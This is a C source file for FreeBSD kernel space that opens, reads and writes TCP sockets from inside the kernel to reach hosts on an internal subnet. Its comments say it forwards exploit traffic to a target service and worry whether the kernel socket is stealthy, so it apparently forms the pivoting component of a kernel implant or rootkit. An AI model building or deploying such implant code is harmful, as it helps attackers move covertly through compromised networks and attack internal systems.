#include "shellproxy.h"
#include "subnet.h"
#include <sys/socketvar.h>
#include <netinet/in.h>

#define SUBNET_CONNECT_TRIES 30
#define SUBNET_RECV_TIMEOUT 3

// connect to something within internal network
int subnet_tcp_connect (const char* ip, int port, struct socket** so)
{
	struct thread* td = curthread;
	struct sockaddr_in sa = {
		.sin_len = sizeof(sa),
		.sin_family = AF_INET,
		.sin_port = htons(port),
	};

	*so = NULL;
	if (inet_aton(ip, &sa.sin_addr)==0)
		return (-1);
	// use socreate. this still applies: https://manpages.debian.org/jessie/freebsd-manpages/socreate.9freebsd
	// create a kernel skt. not sure if this is stealthy, but will look into other viable options. for now since we're forwarding exploit
	// traffic to target srveice, this will do
	if (socreate(AF_INET, so, SOCK_STREAM, IPPROTO_TCP,
	    td->td_ucred, td)!=0)
		return (-1);
	if (soconnect(*so, (struct sockaddr*)&sa, td)!=0)
		goto fail;

	for (int i=0; i<SUBNET_CONNECT_TRIES; i++) {
		SOCK_LOCK(*so);
		int done = ((*so)->so_state & (SS_ISCONNECTED|SS_ISDISCONNECTED))!=0;
		int connected = ((*so)->so_state & SS_ISCONNECTED)!=0;
		SOCK_UNLOCK(*so);
		if (done) {
			if (!connected)
				goto fail;
			proxy_attr_socket(*so);
			return (0);
		}
		pause("sncon", hz/10);
	}

fail:
	soclose(*so);
	*so = NULL;
	return (-1);
}

int
subnet_tcp_read (struct socket* so, unsigned char* buf, int len)
{
	struct timeval tv = { .tv_sec = SUBNET_RECV_TIMEOUT };
	struct sockopt opt = {
		.sopt_dir = SOPT_SET,
		.sopt_level = SOL_SOCKET,
		.sopt_name = SO_RCVTIMEO,
		.sopt_val = &tv,
		.sopt_valsize = sizeof(tv),
	};
	struct iovec iov = {
		.iov_base = buf,
		.iov_len = len,
	};
	struct uio uio = {
		.uio_iov = &iov,
		.uio_iovcnt = 1,
		.uio_offset = 0,
		.uio_resid = len,
		.uio_segflg = UIO_SYSSPACE,
		.uio_rw = UIO_READ,
		.uio_td = curthread,
	};

	(void)sosetopt(so, &opt);
	if (soreceive(so, NULL, &uio, NULL, NULL, NULL)!=0)
		return (-1);
	return (len - uio.uio_resid);
}

int
subnet_tcp_write (struct socket* so, const unsigned char* buf, int len)
{
	struct iovec iov = {
		.iov_base = __DECONST(void*, buf),
		.iov_len = len,
	};
	struct uio uio = {
		.uio_iov = &iov,
		.uio_iovcnt = 1,
		.uio_offset = 0,
		.uio_resid = len,
		.uio_segflg = UIO_SYSSPACE,
		.uio_rw = UIO_WRITE,
		.uio_td = curthread,
	};

	return (sosend(so, NULL, &uio, NULL, NULL, 0, curthread));
}
